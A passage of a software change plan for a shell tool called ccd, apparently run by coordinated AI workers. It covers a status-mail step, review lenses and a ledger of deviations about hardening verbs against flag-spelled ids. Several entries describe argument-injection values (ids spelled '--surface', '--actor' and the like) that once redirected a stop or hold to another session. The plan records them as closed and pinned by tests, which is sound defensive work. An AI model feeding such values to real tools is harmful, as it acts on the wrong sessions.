const lines = ["suite: " + suite];
if (failure) lines.push("failure: " + failure);
lines.push(JSON.stringify({ branchTip: tip, prNumber: Number(pr), prPhase: phase, handoffCommit: tip }));
lines.push(fs.readFileSync(prose, "utf8"));
process.stdout.write(JSON.stringify({ fromId: id, fromUuid: uuid, toId: "coordinator", runId: Number(run), kind: "status", subject: "wave-done", body: lines.join("\n"), artifacts: [] }));
' "$id" "$uuid" "$RUN" "$SUITE" "$FAILURE" "$TIP" "$PR" "$PHASE" "$L/wave-done-prose.md" > "$L/wave-done.json"
"$API" mail send --json "$L/wave-done.json"
```

Expected:
- The response is `{"ok":true,…}`.
- Read the answer from the body, never from the exit status. A `stale-uuid` means the call is re-run whole, with identity derived again.
- After sending, stop pushing (clause 9).
- If the mail list showed a coordinator mail that changes the wave, do not send. Act on it, and re-run this step from the start.

**Commit:** none. This task modifies nothing. The single exception is (3e)'s `docs(census)` commit, made only with the coordinator's recorded agreement.

---

## Review lenses

These lenses run IN ADDITION to the held-out panel (`ccd/coordinator-skill/references/review-panel.md`), which runs as written. Every finding gets the panel's refuters. A lens that dies or returns nothing counts as unverified, never as approval. Every scratch case uses fixture HOMEs only.

### 0. SECURITY: which id a verb binds (opus, xhigh, MANDATORY)

Read all ten loops, `_reg_id_ok`, `_ws_tmproot_id_ok`, stop and ws-add at the tip, against `origin/main` and `server/src/ccdargv.ts`.

**Re-derive:**
- For every builder that composes these verbs, take every flag spelling as the id: each `DASH_IDS` entry, plus `--no-rc`, `--child`, `--route`, `-x` and a `--flag=value` spelling. Try a dec with and without a reason, stop in both builder orders, and stopPair, forget, swap, start, enable and every ws-audit mode positionally. None may bind `agent`, `pwa` or any row but the literal, and none may open a lock or journal against a decoy.
- A lone key at every position, a duplicate key, and a pair in any order must answer today's bytes.
- `_reg_id_ok` under a widening locale.
- Name any verb outside SEC1 D that still scans a `--session` value as a flag, as a stated residual or a finding.

### 1. SAFETY: the collector's lock order and its answers (opus, xhigh)

**Re-derive:**
- For each disk state (witness absent, junk, btime-less or sound; zero, one or two records, each junk, foreign, vanishing, btime-less or sound; `~/.cc-tmp` unresolvable; a registry row of any field or dot family present, unlistable or unmeasurable; an id with no dash; the pause standing), the pre-lock answer equals the answer the locked evaluation gives for that state. The exceptions are the precedence changes spec §2.5 allows and R28 records.
- `registered` still precedes `witness-mismatch` for a live row of any kind.
- No junk name creates `.reap-<id>.lock`.
- Every kept record is listed in the audit document.
- A race between the pass and the lock can only refuse, or be re-evaluated under the lock.

### 2. The frozen corpus, the stamp and the vocabularies (opus, high)

**Re-derive:**
- Every function above R15's insertion (`# THE ID A VERB MAY BIND`) keeps its start line, every function between it and `cmd_start()` moves by one common shift (Task 13 (3b)), every function above `cmd_start()` keeps its line count, and the five census passes are green with no number edited. ws-rename's shifted `local`/`while`/`case` lines carry no anchor.
- The stamp was regenerated, never typed.
- `SANCTIONED` is still 16, `collect-readers` matches in both directions, the WS-AUDIT-COLLECT block has three `_lc_emit` lines, nonpoison still scans 55, and the surface set is spelled twice.
- Every backticked name in a new comment exists.
- The dash-free sentence and the cap sentence each have one source.

### 3. Narrowing and stranding (sonnet, high)

**Re-derive:**
- List every input newly refused, by verb: show that each one is a flag spelling, a dot at the token verbs, or an over-cap id, and that Task 0 measured each such class at zero on both boxes.
- `--actor`, `--reason` and hold-reason prose that begins with `-` is still accepted.
- A dot-leading id at the five `--session` verbs, and plain `ws-audit`, behave as today.
- No existing tag, witness, record or row becomes unclearable.
- Under R27 (b), no minted id between 129 bytes and the cap is relied on by anything the hook's peer census feeds.

---

## Deviations found

**Block issued.** This wave's numbers come from the block the allocator issued for run 433 on 2026-10-14, after #351 merged (R14): twenty-four single numbers, 4980, 4981, 4982, 4983, 4984, 4985, 4986, 4987, 4988, 4989, 4990, 4991, 4992, 4993, 4994, 4995, 4996, 4997, 4998, 4999, 5000, 5001, 5002 and 5003. The coordinator assigns them at the fix round, one per departure. Each is defined here, singly, spelled `D-<n>`. The plan first listed them without the prefix, because a prefixed number above the ledger's defined high-water reds `deviation-refs.test.ts`; that reason no longer holds (F21), because after the merge of `main` a prefixed number at or below the high-water reds nothing, and a number above it raises the high-water by its own definition. Eight more numbers were issued at fix round 1 (allocator, 2026-10-15), one for the plan-text corrections and extra pins of each of Tasks 5, 6, 7, 9, 10, 11, 12 and 13: 5079, 5080, 5081, 5082, 5083, 5084, 5085 and 5086. All thirty-two numbers are defined below, each once: twenty-one substantive departures, one number each, and eleven numbers, one per task, for plan-text corrections and extra pins.

How numbers are issued and assigned:
- The coordinator assigns the numbers at the fix round. Each substantive departure gets its own number, defined here once. Each task gets one number for its plan-text corrections and extra pins.
- A departure the worker finds is named by a short kebab-case slug in the wave-done. The worker never gives it a number.
- The worker never calls the allocator (worker clause 11; coordinator clause 10).
- The worker writes no `D-` token for a number that `origin/main` does not define, and puts none in a commit message.
- A new substantive departure that a later round finds is named by slug in that round's wave-done, and the coordinator allocates its number.
- A sentence of this plan's body that a fix round made false is not edited. The entry that names it corrects the plan's text, and says what changed.

### Substantive departures, one number each

Each entry names what the spec or the plan said, and what the code at the tip does. The R-numbers are this plan's rulings.

- **D-4980** (Task 1) `reg-id-ok-under-lc-all-c` — spec §2.4 asked every post-loop id check to refuse a leading `-` and named no locale, and as built the one rule for an id a verb may bind, `_reg_id_ok`, tests the registry charset under `local LC_ALL=C`, so a locale whose letter ranges admit a non-ASCII letter cannot widen it; `ccd-reg-id-ok.test.ts` pins it with mutation rows of its own, which go red when the `local` is dropped and when `LC_ALL=C` is made global (R4).
- **D-4981** (Task 2) `flag-spelled-token-answers-a-malformed-value` — a token or run id spelled as a flag is taken whole by the three token verbs' loops and refused as `bad token` or `bad run id`, where it answered the usage line; at ws-reclaim that refusal is journaled against the real id (`token-malformed`, `run-id-malformed`), where the usage line journaled nothing, and no server builder composes such an argv (R16, R17).
- **D-4982** (Task 3) `surface-dash-rule-at-stop-and-ws-add-only` — spec §2.4 said `--surface`, `--expect` and `--branch` keep their verb-specific grammars, and as built a `--surface` value that begins with `-` is refused with the verb's usage line at stop and ws-add only, in both the `--surface <v>` and the `--surface=<v>` spellings, because those two positional-id verbs are where it closes a redirect; the eight `--session` verbs keep their surface grammar, since the `--session` pair already closes theirs, and `stop --surface pwa --surface` is refused by the loop's arity check, not by the post-loop id check. Task 3 built stop's half and Task 6 built ws-add's half; it is defined here, under Task 3, and Task 6 shares it (R2).
- **D-4983** (Task 3) `stop-checks-its-residue-and-composed-id` — stop refuses every token left after its flags are stripped that begins with `-` (`bad session id: <token>`) and applies `_reg_id_ok` to the composed id (`bad session id: <id>`), both as bare `die`s that name what they refused and both before `_lc_done`, the operator-choice keep, the unit call and the pane kill, so a refusal leaves no journal row, marker, unit call or tmux call; in the two-argument form a third, dash-leading token that was silently ignored (`stop <wrapper> <project> --x`) now answers `bad session id: --x`, and no server builder composes it (R5, R26).
- **D-4984** (Task 4) `ws-hold-reason-stays-unbounded` — spec §2.4 said that free-form `--actor` and `--reason` prose, "including ws-hold's positional reason", stays non-blank and bounded, and as built the positional hold reason is checked for blankness only and gets no byte cap, so "bounded" holds for the `--actor` and `--reason` decision fields alone; Task 4 built ws-hold's identity arm with no cap, and spec §2.9 records the correction (R8).
- **D-4985** (Task 4) `hold-reason-spelling-a-flag-is-held-verbatim` — a ws-hold reason that is itself a flag spelling is taken whole as the positional pair and held verbatim, where the server's argv held the surface word (the `--surface` arm ate it) or the arity rule answered the usage line; a trailing one no longer answers the usage line (R17).
- **D-4986** (Task 4) `rename-branch-value-taken-whole` — a ws-rename `--branch` value that spells a flag is taken whole as the positional pair and reaches `_ws_branch_valid`, which answers `bad-branch`, where a decision flag's arm ate it and the surface word became the new branch name (R17).
- **D-4987** (Task 4) `valueless-session-key-takes-the-next-flag-as-its-id` — found in the wave, and it changes shipped bytes. At all eight `--session` verbs a `--session` with no value of its own, followed by a decision flag, takes that flag as its id, because the pair stays in the loop's residue (spec §2.4's atomic consumption): `ws-release --session --actor ''` dies on the usage line where it died on `--actor must be non-blank`; at a token verb `--expect <token> --session --surface=w` answers `bad session id` where it answered the usage line; and ws-restore's refusal row names the flag as its id (`--surface`, for example) where it named an empty id, so `ws-restore --session --actor ''` journals `bad-args` against `--actor`. Each is still a refusal, with the same exit code and before any act. Task 2 built the mechanism at the three token verbs and Task 4 at the five `--session` verbs; the slug was ruled at Task 4 and supersedes Task 2's `session-key-before-a-one-word-flag-answers-bad-session-id` (R17).
- **D-4988** (Task 5) `enable-validates-its-project` — spec §2.4 asked `_ws_project_valid` to refuse a leading `-` and said nothing of enable, and as built `enable <wrapper> <project>` asks, before it applies the cap, takes the expiry gate's lock or journals anything, `cmd_start`'s own wrapper check with its words (`unknown wrapper '<w>'`) and then `_ws_project_valid` (`invalid project '<p>'`, "no LEADING dot or dash"), so an unrostered wrapper, a flag-spelled one that reaches the two-argument form, and a dot- or dash-leading project leave no `enable` row and no reap lock; it refuses more than before. Empty input is answered first by `cmd_start`'s usage line (see the Task 5 entry of the corrections below) (R11, with the coordinator's ruling on the first review's enable finding).
- **D-4989** (Task 6) `ws-add-refuses-a-second-actor` — a project spelled `--actor` would be eaten as the decision flag, and a server-side reorder of ws-add's builder is not required (R6): as built ws-add refuses a second `--actor`, in either spelling or any mix of the two, with its existing usage literal, which closes that project without any change to the server's builder order. The duplicate rule covers `--actor` only: the `--surface` and `--child` duplicate rules the drafts proposed are not built, because neither closes a redirect (R6, R18).
- **D-4990** (Task 7) `id-cap-from-the-name-census` — spec §2.6 capped the composed id at 222, the room the quarantine slot leaves, and as built the cap comes from a census of every name derived from an id, in every file under `ccd/` and in `server/src` with doc and skill text excluded (28 templates, held in `ccd-id-cap.test.ts`): the widest overhead is 81 bytes, the hook's claim temp `.<id>.compactcard.<pid>.<nonce>.session-claim.tmp`, so 255 minus 81 leaves 174, and the session hook's own id gate (`CCRC_ID_MAX`, 128) makes its peer census skip a longer id, so `_REG_ID_MAX` is the constant 128, the smaller of the two, which the test derives and compares. R27 (a) was chosen on 2026-10-12, so an id the cap admits is never one the hook's peer census skips, and the residual `ids-over-128-invisible-to-the-hook-peer-census` does not stand. The cap applies at the three mint sites (ws-add once the slug is chosen, start's creating form even when the row exists, enable's two-argument form), each with its own die line, and the sentence lives once in `_REG_ID_CAP_WHY`; `start <id>` and `enable <id>` name an existing row and are not capped (R10, R27).
- **D-4991** (Task 7) `ws-add-lock-precedes-the-cap` — found in the wave. R10 has the cap refuse before anything is created, and ws-add takes its per-project `.ws-add-<project>.lock` before it chooses a slug, so a cap refusal leaves that lock file, as every ws-add refusal after the lock does; no row, worktree, branch or `.uuid` is created, on the positional and the `CCD_WS_SLUG` paths alike. It is the one exception to the cap's "before anything is created" rule (R10).
- **D-4992** (Task 8) `dot-rule-extends-to-the-two-audits` — spec §2.6 asked ws-reclaim and ws-expire to refuse a dot-leading id at entry, and as built all three token verbs' entries (ws-collect already refused one) read the one call `_ws_tmproot_id_ok "$id" || die "bad session id"`, and the dot rule extends to the two audits, for symmetry with `isRegistryId`: `ws-audit --reclaim`, in that mode only, and `_ws_expire_audit_contained`'s entry. The plain reap audit is unchanged and still audits a dot-leading id (R3, R22).
- **D-4993** (Task 8) `dot-leading-audit-now-exits-1-and-the-server-retries` — found in the wave, and it changes shipped behaviour. A dot-leading id at the reclaim and expire audits now dies `bad session id` at exit 1, which `expireArchived.ts` and `childReclaim.ts` read as an unreadable audit and retry, where before they got a terminal `no-such-session` document at exit 0; it is reachable only through a hand-planted run row, until the server's id gate lands (R3, R22).
- **D-4994** (Task 9) `collect-registry-peek-before-the-lock` — spec §2.5 moved the pure checks and an advisory population parse ahead of the lock open, and as built the pre-lock pass keeps a registry peek for a witness that does not parse, so a live row of any kind still answers `registered` ahead of `witness-mismatch`: the lock opens unless `$REG/<id>.child` and `$REG/<id>.uuid` are proven absent, `$REG` can be listed, and the id's slug is free across every `$REG/<id>.<field>` and every dot family, and the locked evaluation then answers `registered` or unmeasured `registry` as before. A junk witness or record of an id that no row names still creates no permanent lock (R12, R21).
- **D-4995** (Task 9) `collect-verb-prelock-refusal-precedes-the-pause` — the verb reads the cleanup pause under the lock, so at ws-collect a pre-lock `witness-mismatch`, `quarantine-kept` or unmeasured answer now comes ahead of `paused` and says that no lock was taken (an unmeasured answer does so where its line fits the reason cap), even while the pause stands; it is terminal for junk either way, nothing moves, and a Task 9 row pins it (R28).
- **D-4996** (Task 9) `prelock-answer-precedes-in-progress` — found in the wave, and it changes shipped behaviour. The pre-lock answers also come ahead of the lock's own: at the audit they precede unmeasured `lock` and `in-progress` (its `mv` and `flock` checks still run first), and at the verb they precede `flock-unavailable`, `lock-unopenable` and `in-progress`. Junk input under a held lock therefore answers the terminal `witness-mismatch` or `quarantine-kept`, where it answered the retryable `in-progress`; that is true whoever holds the lock, because ccd writes a witness or a record by temp file and rename (R21, R28).
- **D-4997** (Task 9) `dash-free-id-answers-unmeasured-registry-before-its-record` — found in the wave, and it changes shipped behaviour. For an id with no `-`, a retryable unmeasured `registry` now comes ahead of every answer the resume gave before its registry rung (the record-judgement words, and the slot, leaf, phase and probe answers) and ahead of a standing `.child` or `.uuid`'s `registered`, where a junk record used to answer the terminal `quarantine-kept`; once the id is in the collector's population it also comes ahead of the listing's unmeasured `records`, while an id with no witness is asked its population first, so a failed listing or `not-witnessed` answers before the pass. The audit document prints `records: []` for it. It is unreachable in practice: every mint composes `<a>-<b>`, and the entry check counted no dash-free name on either box (R21).
- **D-4998** (Task 9) `prelock-no-lock-clause-follows-the-detail` — new at fix round 1 (F3 of review 465). Task 9's text put the 53-byte prefix "no lock was taken, and nothing was moved or removed: " before the locked evaluation's own detail at the verb's pre-lock unmeasured answer, and with a long record path that prefix pushed the detail's operative clause ("was never derived") past the 300-byte reason cap. As built the locked evaluation's detail comes first, with nothing before it, and the clause follows it (`<detail>; no lock was taken, and nothing was moved or removed`), so the clause never pushes the detail toward the cut: a cut takes the clause first, and when the detail alone reaches the cut the clause is dropped whole. The operative words survive while the line reaches them inside the cut (with the pin's stub reason, a record path under about 233 bytes), and the absent `.reap-<id>.lock` is the evidence. The audit adds no prefix, and the pre-lock sites that write their own whole sentences, with no locked detail, are unchanged. The refused site keeps its 19-byte prefix `no lock was taken: ` before a refused detail: measured, it cuts "cannot be read as ccd writes it" only beyond a fixture HOME of about 159 bytes, where flipping it would cut the clause that spec §2.9 promises from about 107 bytes, and `ccd-collect-prelock.test.ts` asserts that clause in three places (F3, review 465; supersedes Task 9's text).
- **D-4999** (Task 10) `section-2-2-verdicts-measured-at-task-10` — spec §8 had the §2.2 verdicts measured by Task 0's entry check, which writes nothing, and as built they were measured at Task 10 by the real-binary matrix of `ccdargv-dash-id-parity.test.ts`, run once against the pre-wave binary (a copy of the base `ccd/ccd` outside the tree, selected through `DASH_PARITY_CCD`, so the tracked file is never overwritten): of 259 cases 188 were red there and 71 green, and all 259 are green at the tip. Spec §2.9 carries the per-verb tables (R20).
- **D-5000** (Task 10) `dash-parity-in-its-own-file` — spec §2.8 put the proof in `ccdargv-dec-parity.test.ts`, and as built it is a new file, `ccdargv-dash-id-parity.test.ts`, which composes every argv through the server's own builders (for stop it adds one typed argv, the order W1a composes) and runs it on `ccd/ccd` under `bash -p` with fixture HOMEs, with an anti-whitelist that keeps every decision-appending verb in it; `ccdargv-dec-parity.test.ts` is unedited (R19).

### Plan-text corrections and extra pins, one number per task

Each task's number covers its plan-text corrections and extra pins, one sub-bullet for each slug or item, in the order of the tasks. An item of fix round 1 is named by its finding (F1 and so on, from review 465).

- **D-5001** (Task 2) plan-text corrections and extra pins — three, each named by slug:
  - `token-verb-controls-use-a-wrong-token`: each token verb's control case sends a well-formed token that no audit minted, so the real id binds, takes its own lock and is refused `state-changed`.
  - `collect-control-runs-on-linux-only`: ws-collect's control runs on Linux only, as the verb's end-to-end suite does.
  - `review-335-f9-needle-outgrows-the-cap-under-this-tmpdir`: two F9 cases of `ccd-review-335-pins.test.ts` fail under a long `TMPDIR`, before the wave as after it, because their expected needle (312 characters under the session's `TMPDIR`) outgrows ccd's 300-byte reason cap; they pass under a short `TMPDIR`, and the file is unedited.
- **D-5002** (Task 3) plan-text corrections and extra pins — three, each named by slug:
  - `stop-residue-red-is-the-pair-form`: the residue rule is observable only in the two-argument form (`stop <wrapper> <project> -x`), because a one-word residue is refused by the composed-id check anyway; deleting the residue line reds the pair case alone, and the eight one-word cases stay green.
  - `stop-pair-project-surface-redirected`: a spec correction. Before the wave, `stopPair` with a project of `--surface` composed `stop <wrapper> --surface --surface pwa`, which stopped `<wrapper>-pwa`, a second stop redirect that spec §2.2's stop row does not list; the last row of the two-argument case pins it refused, and spec §2.9 records it.
  - `stop-extra-pins`: an empty `--surface` value and a dot-leading id keep their meaning (a mutation that over-tightens the surface rule, or adds a dot rule to the composed-id check, goes red), and a refusal journals nothing (a mutation that moves the composed-id check below the journal line goes red).
- **D-5003** (Task 4) plan-text corrections and extra pins — five, each named by slug or finding:
  - `start-line-gate-split-at-task-1s-insert`, also spelled `start-line-table-splits-at-the-id-helpers` in Task 13's pull-request template: the start-line check cannot compare every function with `origin/main`, because Task 1's insert (`# THE ID A VERB MAY BIND`) moves every later function by a common shift, so the gate is split: functions above the insert are compared with `origin/main`, and every function with the task's own parent commit. Reclassified from an expected departure to a correction, because the plan's own gate already splits there.
  - `hold-and-rename-flag-ids-answer-bad-session-id`: ws-hold's ids `--actor` and `--surface` now die `bad session id`, where the arity rule gave the usage line; ws-rename's ids `--actor`, `--surface` and `--reason` answer `bad-args` with the detail `bad session id: <id>`, where they gave the usage detail.
  - `strip-reason-mutant-measured`: the mutation row that makes ws-hold's loop strip `--reason` is measured red by the existing `ccd-actor-flags.test.ts` ("does NOT strip --reason"), as the plan predicted.
  - `census-blind-below-line-5818` (renamed at fix round 1 from `census-blind-below-line-5362`): the compaction-card corpus's census passes stay green under a one-line insert in `ccd/ccd` from line 5818 down, so the line neutrality of this wave's edits there is proven by start-line and line-count diffs, not by the census. First measured at Task 4 as `census-blind-at-ws-restore` (threshold 5362, on the tree before the merges of `main`; Task 5's `census-blind-at-ws-project-valid` folded in) and re-measured at fix round 1 on the tree after the second absorption of `main` (`65614d350`, which was Task 13's, before the pull request opened): an insert after line 5817 reds the `|`-row pass and no other, and an insert after any line from 5818 down reds none, in one contiguous region (about a hundred probes). Every edit of this wave other than the stamp line lies below that line.
  - F4 pins: the valueless-key branch of the five `--session` verbs (`else lc_args+=("$1"); shift; fi`) had no red, so `ccd-session-verbs-dash-id.test.ts` gains seven rows, one per verb as the rulings spell them, each with the verb's full valid argv before the trailing lone key: `--session <REAL> --session` at ws-release, ws-archive and ws-restore; `--session <REAL> --reason r --session` and `--session <REAL> --reason r --reason` at ws-hold; `--session <REAL> --branch b --session` and `--session <REAL> --branch b --branch` at ws-rename (a two-token row cannot red at ws-hold or ws-rename, whose arity rule refuses it either way). Each answers its verb's own words and leaves the hold, the archive mark and the branch standing, and each is red under the mutation applied to its own verb's arm (the hold pair and the rename pair share one arm, so one mutation reds both rows of a pair). At fix round 2 (F4 of review 473) the two ws-rename rows run on a real worktree that ws-add made (row `demo-quiet-basin`, branch `ws/quiet-basin`), because on a planted row with no worktree the document assertion threw first under the rename arm's mutation and the branch assertion never ran. Their document and registry-branch assertions are soft (the ruling named the document assertion; the registry one is soft too, so the worktree's HEAD assertion also runs under the mutant), and a second branch assertion reads the worktree's HEAD. Measured: with the arm mutated to `else shift; fi`, both rows red on the registry branch and on HEAD. The registry listing stays as a guard against a name added or removed, and cannot red under that mutant.
- **D-5079** (Task 5) plan-text corrections and extra pins — three:
  - F5: at the tip `enable '' demo` answered `unknown wrapper ''` and `enable <wrapper> ''` answered `invalid project ''`, where `start` and the base answer the usage line, which spec §2.9 promises. Letting empty input fall through is not the repair (it composes `-demo`, passes the cap, opens a permanent `.reap--demo.lock`, clears a standing archive and journals before `cmd_start` answers), so enable's two-argument block now opens with `cmd_start`'s own check and words, `[[ -n "$1" && -n "$2" ]] || die "usage: ccd start <id> | ccd start <wrapper> <project> [workdir]"`, joined to the `if` line to stay line-neutral and ahead of the wrapper check, the project check, the cap, the expiry gate and the journal. Its pin in `ccd-project-dash.test.ts` runs the forms `'' demo`, `<wrapper> ''` and `'' ''` on the real functions in a fixture HOME and asserts start's usage line at rc 1, no journal row, no `.reap-` lock and a planted archive marker left standing; it is red with the check removed and red under a true fall-through. A correction, not a departure.
  - `merge-moves-a-stale-citation-under-a-rewritten-comment` (F1): after the merge of `main`, which moved `_ws_project_valid` down 19 lines, Task 5's line-neutral fold of that function's header comment put the words `ccd project-pool --clear` on the line that a frozen corpus citation of `ccd/ccd:6478` names (stale on `main`), and the citation's clause carries the bare token `ccd`, so the stale citation was anchored by that token alone; session-hook's citation debt read 146 on the merged tree where it reads 147 on `main`, and its FACT TWO went non-empty. The comment's last two lines are re-folded in place, still line-neutral, so that line 6478 ends at "the verb that clears it refused its own name:" and carries no bare `ccd`, and `ccd/ccd` is restamped; the seven census passes are green at 147 with FACT TWO empty, and `session-hook.test.ts` is unedited.
  - `census-blind-at-ws-project-valid`: Task 5's measurement of the same census blindness inside `_ws_project_valid`, folded into the Task 4 entry's `census-blind-below-line-5818` and listed here for completeness only.
- **D-5080** (Task 6) plan-text corrections and extra pins — two:
  - `ws-add-dash-test-imports-ccdargv`: `ccd-ws-add-dash-id.test.ts` imports `CCD_ARGV` and the `ActorFlags` type from `server/src/ccdargv.ts`, read-only, to compose the server's own ws-add argv (Task 10's matrix does the same); no `server/src` file is changed.
  - the brief's extra pins: the `--surface=` mutation row, the dash-leading actor prose case (an `--actor` value that begins with `-` still creates the workspace, in both spellings), and mutation rows 5 (Task 5's dash line, reached through the composed argv) and 6 (the narrowing guard: actor prose keeps its domain).
- **D-5081** (Task 7) plan-text corrections and extra pins — eight:
  - `id-cap-census-table-measured-at-the-export`: the census table in `ccd-id-cap.test.ts` is the export's 28 templates; Task 0 re-measured the census on this tree with the plan's own scanner (176 files, 68 distinct shapes, none uncovered by the table, none stale) and found it identical, with 81 bytes the widest overhead.
  - `census-compares-normalised-shapes`: the scan reduces each spelling it finds to a normalised shape (the id as `<id>`, each variable part as a placeholder such as `<pid>`, `<R>` or `<nonce>`) and compares that shape with the table's templates, not the raw text. The one `<id>.<field>` row's 15-byte bound is checked for a lowercase field written literally inside the name, in every scanned file under `ccd/` and `server/src`, and FIELD_MAX itself is pinned to the longest `_reg_set|get|read` field literal in `ccd/ccd`. A placeholder field (`$2`, `${f}`, `$f`, `$field`, `${field}`, `${name}`) matches the family row with no length check, so a field literal passed as an argument to such a template, as `regPresence`'s callers pass theirs, is read by no length scan: `history-field-literals-passed-as-arguments-outside-the-field-max-scan`, carried in the named list below (corrected at fix round 2, F6 of review 473).
  - `census-excludes-the-token-generation-file`: `server/src/token/files.ts` is left out of the scan, because its `${id}` is a box-token generation id and never a session id (`mail-pending-<generation>.token` embeds no registry id); the case checks the exclusion is not stale (the file exists and still holds a hit), and the exclusion is the stated residual `files-outside-the-name-census`.
  - `reg-id-cap-under-lc-all-c-pinned`: `_reg_id_cap` counts bytes under `local LC_ALL=C`, pinned as text (a mutation that drops it goes red) and with no behavioural bytes-against-characters case, because every composed id is already restricted to the ASCII registry charset before the cap runs.
  - `enable-cap-written-as-an-if`: enable's cap is the statement `if (( $# >= 2 )); then _reg_id_cap "$id" || die …; fi`, which caps the two-argument form only and leaves `enable <id>`, which names an existing row, uncapped.
  - F6: the cap comment in `ccd/ccd` and the opening comment of `ccd-id-cap.test.ts` said that an id over 128 "silently loses its card and its listing". The hook's 128 gate skips only other rows in its peer census, and a session's own card turns on its project (`CCRC_PROJ_MAX`, 64), so both now say that such an id loses its place in its peers' counts, not its own card. The cap stays 128.
  - F7: nothing pinned the exemption of `enable <id>`: mutating `if (( $# >= 2 ))` to `>= 1` left the suites green. `ccd-id-cap.test.ts` gains a case in which `enable <id>` with a hand-planted row over the cap stays startable while the two-argument form for the same id is refused, red under that mutation.
  - the merge's widening (`b55fd0a4e`, fix round 1; F6 of review 473): the third absorption of `main` (`7bfef06cc`, of `main` at `a3cebde1b`) brought #404's `regPresence` (`${P.reg}/${id}.${field}`, in `ccd/history/cli.mjs`), which the anti-whitelist case named as a template no row covers. The tokenizer now reads `${field}` as the field placeholder, and no row is added. It is sound because its callers pass `harness`, `generation`, `project` and `workdir`, 10 bytes at most; review 473 measured that it hides no over-cap path.
- **D-5082** (Task 9) plan-text corrections and extra pins — twelve:
  - `child-uuid-peek-pinned-by-an-unmeasurable-child`: deleting the registry peek's `.child` and `.uuid` arm reds only the case with an unmeasurable `.child`; the plain `.uuid` and `.child` rows stay green, because the slug-free check also sees them.
  - `other-id-record-reached-only-through-a-stubbed-reader`: a record that parses and names another id is reached only through a stubbed `_ws_collect_record_read`, because on a real disk that record is refused as one that cannot be read as ccd writes it; the stub half is the case that turns red under a mutation of the compare.
  - `prelock-second-look-sound-is-unmeasured`: when the second look at a junk record or witness reads sound, the pass answers unmeasured `records` or `witness`, under the existing probe words, at exit 1, rather than a refusal.
  - `prelock-reads-the-witness-for-the-document`: when records stand but none names the id, the pass reads the witness so that the audit document reports it, as the fork's resume arm does.
  - `prelock-prefix-cuts-the-rc3-detail`: Step 7's STOP fired. `ccd-ws-collect-resume.test.ts`'s rc-3 case is red at a `TMPDIR` of 67 and of 81 characters and green at base; the account reported it as not fired, because it was measured only at about 47 characters. The repair is `prelock-no-lock-clause-follows-the-detail` (F3), which has its own number.
  - F3's committed pin: `ccd-collect-prelock.test.ts` gains "a resume record whose slot cannot be derived keeps 'was never derived' whole: the detail first, then the no-lock clause", which needs no long `TMPDIR` (`ccd-ws-collect-resume.test.ts` is behind the hard boundary). It stubs the rc-3 reader and pads its `_WS_QPATH_WHY` by a length it computes from its own record path, so that the operative clause ends at byte 274 of the 300-byte line, and asserts the detail first, a truncated line, the journal row, no reap lock and the leaf and record untouched. It is green at `TMPDIR` lengths of 47, 67 and 81 and red under the prefix-first mutant; the no-dash case's pinned text is re-pointed to the new order, and the resume file is also green at 67 and 81 (a measurement only). The case fails loudly on its own window assertion only where the record path alone passes about 233 bytes.
  - the refused site stays: the verb's refused answer keeps `no lock was taken: ` before its detail. Its 19-byte prefix cuts the operative words ("cannot be read as ccd writes it") only beyond a fixture HOME of about 159 bytes, where flipping it would cut the clause that spec §2.9 promises from about 107 bytes, and `ccd-collect-prelock.test.ts` asserts that clause in three places.
  - `archived-expiry-census-fourth-collect-failed-site` (F2, record-only): `archived-expiry-policy.test.ts`'s census (`collected`) held three `cmd_ws_collect failed probe-unmeasured` sites, and Task 9's pre-lock unmeasured failure is a fourth, so the file was red alone and green on `main`. The coordinator licensed the one line, a fourth `'cmd_ws_collect failed probe-unmeasured',` after the third (those census rows are child reclamation's), and the file is 76 of 76. Task 9's run list omitted this file, which is why the break surfaced only at Task 13.
  - F12, header half: the `_ws_collect_prelock` header said the pass "writes nothing". It makes two scratch files in listing the records and removes them before it returns, so the header now says it grants nothing, prints nothing and writes no registry, lock, journal or quarantine state, in the same four lines, restamped.
  - F1 of review 473 (fix round 2): the contract note's SEC7 list names `prelock-no-lock-clause-follows-the-detail`, and the prose test's `DEPARTURES` carries it. The record reader's rc-3 answer (the quarantine arm) always passes the 300-byte cap, because its detail alone is at least 318 bytes, so the live rc-3 pre-lock line is that detail cut at 300 bytes plus "…", with no clause, and the absent `.reap-<id>.lock` is the evidence. The answers with short details carry the clause whole, and the pin pads a stub reason into the window where the clause is what gets cut, a window the live rc-3 line never reaches.
  - F3 of review 473: the source describe of `ccd-collect-prelock.test.ts` said "a pass that writes nothing"; it is titled by what its cases pin, "a pass that prints, journals and locks nothing". F12's wider scope stays in the `_ws_collect_prelock` header.
  - F5 of review 473: the pin's comment said the clause ends inside the window "at any TMPDIR" and called the 53 bytes a clause. It now says the window holds while the record path is at most 233 bytes (beyond that, the window assertion reds), and that the 53 bytes are the prefix.
- **D-5083** (Task 10) plan-text corrections and extra pins — one:
  - `hold-and-rename-arms-are-matrix-blind`: deleting ws-hold's `--session|--reason` arm or ws-rename's `--session|--branch` arm leaves every row of the dash-id parity matrix green (all 16 rows of each, measured), because the matrix asserts a refusal with no act and those ids are refused either way, by arity or by the id check; Task 4's `ccd-session-verbs-dash-id.test.ts` pins both arms. Recorded, not a pin.
- **D-5084** (Task 11) plan-text corrections and extra pins — one:
  - `expire-v1-note-already-rewritten`: Task 11 Step 0 (t7) expects 1 line that says "this wave ships it inert", not 2, and Step 4 and Task 13 Step 4 expect 0, not 1, because workspace lifecycle's wave (#351) had already rewritten the EXPIRE-V1 note, so `main` carries only COLLECT-V1's; no assertion was adapted. The residual `expire-v1-note-ships-it-inert` is therefore dropped (measured 0), and its bullet below is left as the plan wrote it.
- **D-5085** (Task 12) plan-text corrections and extra pins — seventeen:
  - `issued-block-written-without-the-d-prefix`: the preface listed the issued block without the `D-` prefix, because a prefixed number above the ledger's defined high-water reds `deviation-refs.test.ts`; fix round 1 withdraws that reason (F21), since after the merge of `main` a prefixed number at or below the high-water reds nothing and a number above it raises the high-water by its own definition, so the preface's last sentence is edited in place and every number is now defined as `D-<n>`.
  - the superseded note: the bullet "The worker writes no `D-` token for a number that `origin/main` does not define…", in the list under "How numbers are issued and assigned", is the plan's body and is not edited. For the definitions of this fix round the coordinator's direction supersedes it, under the rule of the bullet "A sentence of this plan's body that a fix round made false is not edited…"; its half about a commit message stands, and no commit message of this wave carries a `D-` token.
